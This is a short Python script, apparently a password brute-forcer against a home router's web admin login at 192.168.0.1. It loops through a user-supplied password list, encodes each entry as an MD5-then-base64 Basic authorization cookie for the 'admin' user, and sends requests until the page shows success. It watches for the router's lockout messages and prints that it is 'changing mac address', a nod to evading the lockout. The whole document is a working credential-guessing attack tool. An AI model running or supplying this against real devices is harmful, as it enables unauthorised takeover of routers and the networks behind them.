import requests
import hashlib
import base64
from simple_colors import *
iprt = '192.168.0.1'
#opne file is loop 
listpas = input("Enter password list: ")
passinpot = open(listpas, 'r').readlines()
for line in passinpot:
  a = line.strip()
  source = a.encode()
  md5 = hashlib.md5(source).hexdigest()
  encodedBytes = base64.urlsafe_b64encode(md5.encode("utf-8"))
  encodedStr = str(encodedBytes, "utf-8")
  cookies = {
  'Authorization': 'Basic%20YWRtaW46'+encodedStr,
  }
  headers = {
  'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'Accept-Language': 'en-US,en;q=0.5',
  'Connection': 'keep-alive',
  'Referer': 'http://'+iprt+'/',
  'Upgrade-Insecure-Requests': '1',
  }
  params = (
    ('Save', 'Save'),
    )
  response = requests.get('http://'+iprt+'/userRpm/LoginRpm.htm', params=params, cookies=cookies)


  if 'The router allows only one administrator to login at the same time, please try again later.' in response.text:
      print('Your address has been blocked\nchanging mac address...')
      print(a)
  if 'You have exceeded ten attempts, please try again after two hours' in response.text:
      print('Your address has been blocked\nchanging mac address...')
      print(a)
  if 'The username or password is incorrect, please input again' in response.text:
      print("Tring password"+' '+a)

  if 'javaScript">window.parent.location.href = "http://' in response.text:
    print(green('correct'))
    print(green('the password is', 'bold'))
    print(green(a, ['bold', 'underlined']))
    break
#_____________________________________________________________________________________________